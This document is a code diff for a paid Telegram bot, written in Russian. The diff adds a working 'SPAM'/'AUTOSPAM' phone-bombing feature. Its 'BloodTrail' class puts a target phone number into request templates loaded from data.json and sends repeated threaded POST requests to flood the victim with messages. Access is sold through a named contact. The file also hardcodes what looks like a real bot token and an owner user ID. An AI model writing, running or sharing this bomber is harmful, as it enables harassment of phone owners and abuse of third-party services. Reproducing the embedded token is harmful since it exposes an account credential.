@@ -1,4 +1,7 @@
 import json
+from threading import Thread
+import requests
+import sys
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
 import logging
@@ -10,85 +13,182 @@ logger = logging.getLogger(__name__)
 # Your Telegram bot token
 TOKEN = "7618261878:AAGyoMuFThdLwOMbcBIR9W9rqo2wq2abVlA"
 
-# Load data from data.json
-def load_data():
+# Your Telegram User ID (replace this with your actual Telegram user ID)
+YOUR_USER_ID = 5252716406  # Replace with your actual user ID
+
+# Load paid users from data.json
+def load_paid_users():
     try:
         with open("data.json", "r", encoding="utf-8") as f:
-            return json.load(f)
+            data = json.load(f)
+            return data["paid_users"]["users"]
     except FileNotFoundError:
-        return {"last_used_number": None, "paid_users": {"users": []}, "services": {}}
+        return []
 
-# Save data to data.json
-def save_data(data):
-    with open("data.json", "w", encoding="utf-8") as f:
-        json.dump(data, f, ensure_ascii=False, indent=4)
+# Save paid users to data.json
+def save_paid_users(user_id):
+    try:
+        with open("data.json", "r", encoding="utf-8") as f:
+            data = json.load(f)
 
-# /start command
+        if user_id not in data["paid_users"]["users"]:
+            data["paid_users"]["users"].append(user_id)
+
+        with open("data.json", "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False, indent=4)
+    except FileNotFoundError:
+        data = {
+            "paid_users": {
+                "users": [user_id]
+            }
+        }
+        with open("data.json", "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False, indent=4)
+
+class BloodTrail:
+    def __init__(self, number):
+        self.stop_spam = False
+        try:
+            with open("data.json", "r", encoding="utf-8") as f:
+                self.data = json.load(f)
+            self.number = number
+            self.data["last_used_number"] = self.number
+            with open("data.json", "w", encoding="utf-8") as j:
+                json.dump(obj=self.data, fp=j, ensure_ascii=False, indent=4)
+        except FileNotFoundError:
+            print(f"ERROR: data.json file not found.")
+            sys.exit()
+
+    def format_data(self):
+        for service in self.data["services"]:
+            for k, v in self.data["services"][service]["data"].items():
+                if "%NUMBER%" in v:
+                    v = v.replace("%NUMBER%", self.number[int(self.data["services"][service]["phone_f"]):])
+                    self.data["services"][service]["data"][k] = v
+
+    @staticmethod
+    def post_request(service, url, data=None, json_data=None):
+        if json_data:
+            requests.post(url=url, json=json_data)
+        else:
+            requests.post(url=url, data=data)
+
+    def start_threads(self, repeats=1):
+        threads = []
+        for i in range(repeats):
+            if self.stop_spam:
+                break
+            for service in self.data["services"]:
+                if self.stop_spam:
+                    break
+                data_type = self.data["services"][service]["data_type"]
+                if data_type == "json":
+                    t = Thread(target=self.post_request, args=(service,
+                                                               self.data["services"][service]["url"],
+                                                               None,
+                                                               self.data["services"][service]["data"]))
+                else:
+                    t = Thread(target=self.post_request, args=(service,
+                                                               self.data["services"][service]["url"],
+                                                               self.data["services"][service]["data"],
+                                                               None))
+                threads.append(t)
+                t.start()
+
+        for thread in threads:
+            thread.join()
+
+    def stop(self):
+        self.stop_spam = True
+
+# Start command with SPAM and AUTOSPAM buttons
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [
-        [InlineKeyboardButton("SPAM", callback_data='spam')],
-        [InlineKeyboardButton("AUTOSPAM", callback_data='autospam')],
-        [InlineKeyboardButton("Send to Multiple Numbers", callback_data='multiple_numbers')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text("Выберите действие:", reply_markup=reply_markup)
+    user_id = update.effective_user.id
+    paid_users = load_paid_users()
 
-# Handle Send to Multiple Numbers button
-async def multiple_numbers_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if user_id == YOUR_USER_ID or user_id in paid_users:
+        # If the user is you or a paid user, show the options
+        keyboard = [
+            [InlineKeyboardButton("SPAM", callback_data='spam'), InlineKeyboardButton("AUTOSPAM", callback_data='autospam')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text("Добро пожаловать в Секретный бот! Выберите 'SPAM' или 'AUTOSPAM'.", reply_markup=reply_markup)
+    else:
+        # If the user is not authorized, show restricted access message
+        await update.message.reply_text("Напишите его @muslimtm1, оно платное!")
+
+# Handle SPAM button
+async def spam_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    context.user_data['multiple_numbers'] = []  # Initialize the list for storing phone numbers
-    await query.edit_message_text("Введите первый номер, например: +77XXXXXXXX")
-    context.user_data['spam_state'] = 'waiting_for_multiple_numbers'
 
-# Handle user input for multiple phone numbers
+    # Ask for phone number
+    await query.edit_message_text("Введите номер, например: +77XXXXXXXXX")
+    context.user_data['spam_state'] = 'waiting_for_number_spam'
+
+# Handle AUTOSPAM button
+async def autospam_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    # Ask for phone number
+    await query.edit_message_text("Введите номер, например: +77XXXXXXXXX")
+    context.user_data['spam_state'] = 'waiting_for_number_autospam'
+
+# Handle user input for SPAM and AUTOSPAM
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if 'spam_state' in context.user_data:
         state = context.user_data['spam_state']
-
-        if state == 'waiting_for_multiple_numbers':
-            phone_number = update.message.text.strip()
-
-            # Validate the phone number
-            if not phone_number.startswith("+77") or len(phone_number) != 12 or not phone_number[1:].isdigit():
-                await update.message.reply_text("Пожалуйста, введите корректный номер, например: +77XXXXXXXX.")
-                return
-
-            # Add the phone number to the list
-            context.user_data['multiple_numbers'].append(phone_number)
-            await update.message.reply_text(
-                f"Номер {phone_number} добавлен. Введите следующий номер или отправьте 'STOP', чтобы прекратить."
-            )
-        elif state == 'waiting_for_repeats_multiple':
+        if state == 'waiting_for_number_spam':
+            context.user_data['phone_number'] = update.message.text
+            await update.message.reply_text("Введите число на спам.")
+            context.user_data['spam_state'] = 'waiting_for_repeats_spam'
+        elif state == 'waiting_for_repeats_spam':
             try:
                 repeats = int(update.message.text)
-                phone_numbers = context.user_data['multiple_numbers']
+                phone_number = context.user_data['phone_number']
                 context.user_data['spam_state'] = None
 
-                # Run spam process for each phone number
-                for number in phone_numbers:
-                    # Add your spam logic here
-                    # For now, let's just simulate success
-                    logger.info(f"Spamming {number} for {repeats} times!")
+                # Run spam process
+                bloodtrail = BloodTrail(phone_number)
+                bloodtrail.format_data()
+                bloodtrail.start_threads(repeats)
 
-                numbers_list = " и ".join(phone_numbers)
-                await update.message.reply_text(
-                    f"Успешный спам завершён на номера: {numbers_list} за {repeats} раз!"
-                )
+                await update.message.reply_text(f"Успешный спам завершён на номер {phone_number} за {repeats} раз!")
+            except ValueError:
+                await update.message.reply_text("Пожалуйста, введите корректное число.")
+        elif state == 'waiting_for_number_autospam':
+            context.user_data['phone_number'] = update.message.text
+            await update.message.reply_text("Введите число на спам.")
+            context.user_data['spam_state'] = 'waiting_for_repeats_autospam'
+        elif state == 'waiting_for_repeats_autospam':
+            try:
+                repeats = int(update.message.text)
+                phone_number = context.user_data['phone_number']
+                context.user_data['spam_state'] = None
+
+                # Show STOP button
+                keyboard = [[InlineKeyboardButton("STOP", callback_data='stop')]]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                await update.message.reply_text(f"Успешный автоспам начат на номер {phone_number}!", reply_markup=reply_markup)
+
+                # Run auto spam
+                context.user_data['spam_instance'] = BloodTrail(phone_number)
+                bloodtrail = context.user_data['spam_instance']
+                bloodtrail.format_data()
+                bloodtrail.start_threads(repeats)
             except ValueError:
                 await update.message.reply_text("Пожалуйста, введите корректное число.")
 
-# Callback query handlers
-async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# Handle STOP button
+async def stop_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
 
-    if query.data == "spam":
-        await query.edit_message_text("SPAM выбрано. (Допишите функционал здесь.)")
-    elif query.data == "autospam":
-        await query.edit_message_text("AUTOSPAM выбрано. (Допишите функционал здесь.)")
-    elif query.data == "multiple_numbers":
-        await multiple_numbers_button(update, context)
+    if 'spam_instance' in context.user_data:
+        bloodtrail = context.user_data['spam_instance']
+        bloodtrail.stop()
+        await query.edit_message_text("Авто спам остановлен.")
 
 # Main function to run the bot
 def main():
@@ -98,7 +198,9 @@ def main():
     application.add_handler(CommandHandler("start", start))
 
     # Callback query handlers
-    application.add_handler(CallbackQueryHandler(callback_handler))
+    application.add_handler(CallbackQueryHandler(spam_button, pattern='spam'))
+    application.add_handler(CallbackQueryHandler(autospam_button, pattern='autospam'))
+    application.add_handler(CallbackQueryHandler(stop_button, pattern='stop'))
 
     # Message handler for user input
     application.add_handler(MessageHandler(filters.TEXT, handle_message))
